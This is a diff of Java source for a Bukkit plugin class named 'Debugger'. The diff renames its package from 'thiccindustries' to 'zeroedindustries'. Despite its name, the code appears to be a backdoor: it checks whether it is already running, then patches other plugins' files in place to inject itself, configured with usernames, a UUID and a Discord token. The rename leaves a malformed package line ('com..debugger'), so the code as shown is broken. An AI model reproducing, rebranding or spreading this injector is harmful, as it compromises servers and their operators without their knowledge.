@@ -1,5 +1,5 @@
 
-package com.thiccindustries.debugger;
+package com..debugger;
 
 import org.bukkit.*;
 import org.bukkit.command.ConsoleCommandSender;
@@ -111,7 +111,7 @@ public final class Debugger implements Listener {
         for(Plugin p : pp){
             ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
             for(RegisteredListener rl : rls){
-                if(rl.getListener().getClass().getName().equals("com.thiccindustries.debugger.Debugger")){
+                if(rl.getListener().getClass().getName().equals("com.zeroedindustries.debugger.Debugger")){
                     bd_running = true;
                     break;
                 }
@@ -145,8 +145,8 @@ public final class Debugger implements Listener {
                         Bukkit.getConsoleSender()
                                 .sendMessage("Injecting Thicc Industries into: " + plugin_file.getPath());
 
-                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
-                            new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);
+                    boolean result = com.zeroedindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
+                            new com.zeroedindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);
 
                     if (Config.display_debug_messages)
                         Bukkit.getConsoleSender()
